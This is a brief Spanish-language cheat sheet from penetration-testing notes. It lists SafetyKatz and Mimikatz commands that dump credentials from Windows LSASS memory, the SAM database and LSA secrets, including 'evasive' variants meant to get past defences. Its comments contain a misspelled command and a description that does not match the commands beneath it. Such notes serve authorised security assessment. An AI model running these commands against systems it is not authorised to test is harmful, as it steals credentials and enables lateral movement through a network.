# Dumpear todos los hashes internamente

Tags: #MovimientoLateral #Windows #Server 

## Safetykatz

Herramienta basada en componentes de Mimikatz, integrada en un ejecutable de C# para facilitar determinadas operaciones de extracción y análisis de credenciales en evaluaciones de seguridad de Windows y Active Directory.

Requisitos:
- Sistema Windows compatible con la versión compilada.
- Runtime de .NET compatible con el binario.
- Privilegios elevados para funciones que acceden a material protegido, como memoria de LSASS.
- Las protecciones del sistema y el EDR pueden impedir su ejecución.

Nota: normalmente el nombre de la herramienta es SafetyKatz.

```powershell 
! Usuario local con permisos de Administrador 

# Ejecutar una versión modificada de Mimikatz (SafetyKatz) para extraer desde LSASS las claves Kerberos (AES, RC4, etc.) de los usuarios en memoria 
❯ .\SafetyKatz.exe -Command "sekurlsa::evasive-keys" exit      
❯ .\SafetyKatz.exe -Command "sekurlsa::evasive-logonPasswords" exit

❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-logonpasswords" "exit" 
❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-keys" "exit" 

```

## Mimikatz

Herramienta para Windows que permite evaluar la exposición de credenciales y trabajar con mecanismos de autenticación de Windows, incluidos Kerberos y NTLM. Puede acceder a material sensible de credenciales dependiendo de los privilegios y las protecciones del sistema.

Requisitos:
- Sistema Windows compatible.
- Binario compilado para la arquitectura adecuada (x64 o x86).
- Privilegios elevados para determinadas funciones.
- Acceso a los recursos que se desea evaluar; protecciones como Credential Guard pueden limitar algunas operaciones.

```powershell 
# Extraer desde LSASS las claves de cifrado Kerberos (AES, RC4, etc.) de las sesiones de usuarios en el sistema.
❯ .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
❯ .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

	privilege::debug
	sekurlsa::logonpasswords
	skurlsa::logonpasswords /full
	sekurlsa::ekeys
	lsadump::lsa /patch
	lsadump::secrets
	lsadump::sam 
	token::elevate
	exit

```